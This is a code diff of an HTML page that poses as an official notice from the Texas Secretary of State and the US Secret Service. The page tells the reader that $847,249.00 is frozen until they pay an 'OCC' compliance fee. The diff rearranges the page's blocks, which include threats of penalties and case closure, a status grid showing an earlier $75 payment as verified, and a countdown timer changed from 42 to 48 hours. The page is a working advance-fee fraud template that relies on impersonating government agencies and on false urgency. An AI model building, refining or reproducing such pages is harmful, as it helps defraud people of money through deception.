-                        <div id="timer" style="font-size:36px;font-weight:900;color:#dc2626;margin:10px 0;font-family:monospace;">42:00:00</div>
-                        <p style="font-size:13px;color:#7f1d1d;">If the fee is not paid before the timer expires, your case will be closed and you will need to restart the process.</p>
+                    <!-- BACK TO TOP -->
+                    <div style="text-align:center;margin:20px 0;">
+                        <a href="#page1" class="back-top">⬆ Back to Transaction Status</a>
                     </div>
 
-                    <!-- Warning List -->
-                    <div class="warning-box">
-                        <h4>🚫 What Happens If You Do Not Pay the OCC Fee?</h4>
-                        <ul>
-                            <li><span>✗</span> The OCC will <strong style="color:#991b1b;">not conduct</strong> the final compliance review</li>
-                            <li><span>✗</span> The bank <strong style="color:#991b1b;">cannot legally release</strong> your <strong style="color:#991b1b;">$847,249.00</strong> funds</li>
-                            <li><span>✗</span> Your case will remain <strong style="color:#991b1b;">pending indefinitely</strong></li>
-                            <li><span>✗</span> Your funds will remain <strong style="color:#991b1b;">frozen</strong> in the bank's holding account</li>
-                            <li><span>✗</span> You may be subject to <strong style="color:#991b1b;">additional penalties or interest</strong></li>
-                            <li><span>✗</span> The OCC may <strong style="color:#991b1b;">close your case entirely</strong>, requiring you to restart the process — which could take <strong style="color:#991b1b;">weeks or months</strong></li>
-                        </ul>
-                    </div>
-
-                    <!-- Best Course of Action -->
-                    <div class="action-box">
-                        <div style="font-weight:700;color:#991b1b;font-size:16px;margin-bottom:6px;">⚠️ Your Best Course of Action</div>
-                        <div style="font-size:14px;color:#7f1d1d;line-height:1.7;">
-                            To avoid delays, additional penalties, or potential case closure, we strongly recommend completing the OCC payment <strong style="color:#991b1b;">as soon as possible</strong>. Once the fee is paid and the review is completed, your funds will be released within <strong style="color:#991b1b;">24 hours</strong>.
+                    <!-- STATUS SUMMARY -->
+                    <div class="card">
+                        <div class="card-header">
+                            <span>📊 Current Status Summary</span>
                         </div>
-                        <div style="font-size:14px;color:#7f1d1d;margin-top:8px;font-weight:700;padding:10px 14px;background:#fff;border-radius:6px;border:1px solid #fecaca;">
-                            ✅ This is the <strong style="color:#991b1b;font-size:15px;">final step</strong> in your case. After this, <strong style="color:#991b1b;">no further fees or requirements</strong> will be necessary.
+                        <div class="card-body">
+                            <div class="status-grid">
+                                <div class="status-item"><span>✅ $75.00 Payment</span> <span class="green">Verified (Jun 26)</span></div>
+                                <div class="status-item"><span>✅ Reports Submitted</span> <span class="green">Completed (Jun 23)</span></div>
+                                <div class="status-item"><span>✅ ID &amp; FRC Documents</span> <span class="green">Submitted (Jun 23)</span></div>
+                                <div class="status-item"><span>❌ Bank Attempted Release</span> <span class="red">BLOCKED 100% (Jun 26)</span></div>
+                                <div class="status-item"><span>⏳ OCC Notice Received</span> <span class="yellow">Received (Jun 26)</span></div>
+                                <div class="status-item"><span>⏳ OCC Final Compliance Review</span> <span class="red">PENDING</span></div>
+                            </div>
+                            <div id="holdContainer" style="
+                                margin-top:12px;
+                                padding:14px;
+                                background:#fef2f2;
+                                border:2px solid #dc2626;
+                                border-radius:8px;
+                                text-align:center;
+                            ">
+                                <div id="holdText" style="font-weight:700;color:#dc2626;font-size:clamp(13px, 3vw, 15px);">
+                                    ⛔ Your $847,249.00 funds are on HOLD — awaiting OCC clearance
+                                </div>
+                            </div>
                         </div>
                     </div>
-                </div>
-            </div>
 
-            <!-- BACK TO TOP -->
-            <div style="text-align:center;margin:20px 0;">
-                <a href="#page1" class="back-top">⬆ Back to Transaction Status</a>
-            </div>
-
-            <!-- STATUS SUMMARY -->
-            <div class="card">
-                <div class="card-header">
-                    <span>📊 Current Status Summary</span>
-                </div>
-                <div class="card-body">
-                    <div class="status-grid">
-                        <div class="status-item"><span>✅ $75.00 Payment</span> <span class="green">Verified (Jun 26)</span></div>
-                        <div class="status-item"><span>✅ Reports Submitted</span> <span class="green">Completed (Jun 23)</span></div>
-                        <div class="status-item"><span>✅ ID &amp; FRC Documents</span> <span class="green">Submitted (Jun 23)</span></div>
-                        <div class="status-item"><span>❌ Bank Attempted Release</span> <span class="red">BLOCKED 100% (Jun 26)</span></div>
-                        <div class="status-item"><span>⏳ OCC Notice Received</span> <span class="yellow">Received (Jun 26)</span></div>
-                        <div class="status-item"><span>⏳ OCC Final Compliance Review</span> <span class="red">PENDING</span></div>
-                    </div>
-                    <div id="holdContainer" style="
-                        margin-top:12px;
-                        padding:14px;
-                        background:#fef2f2;
-                        border:2px solid #dc2626;
-                        border-radius:8px;
-                        text-align:center;
-                    ">
-                        <div id="holdText" style="font-weight:700;color:#dc2626;font-size:15px;">
-                            ⛔ Your $847,249.00 funds are on HOLD — awaiting OCC clearance
-                        </div>
+                    <!-- FOOTER -->
+                    <div class="footer">
+                        Texas Secretary of State — Document Registration &amp; Certification Division<br>
+                        In cooperation with the Cyber Fraud Task Force, Dallas Field Office • United States Secret Service<br>
+                        © 2026 State of Texas. All rights reserved. This is an official government communication.
                     </div>
                 </div>
-            </div>
-
-            <!-- FOOTER -->
-            <div class="footer">
-                Texas Secretary of State — Document Registration &amp; Certification Division<br>
-                In cooperation with the Cyber Fraud Task Force, Dallas Field Office • United States Secret Service<br>
-                © 2026 State of Texas. All rights reserved. This is an official government communication.
             </div>
         </div>
     </div>
@@ -1029,8 +1076,8 @@
     <!-- ===== CONSOLIDATED JAVASCRIPT ===== -->
     <script>
         (function() {
-            // ===== COUNTDOWN TIMER (42 HOURS) =====
-            let timeLeft = 42 * 60 * 60; // 42 hours in seconds
+            // ===== COUNTDOWN TIMER (48 HOURS) =====
+            let timeLeft = 48 * 60 * 60; // 48 hours in seconds
             
             function updateTimer() {
                 const hours = Math.floor(timeLeft / 3600);
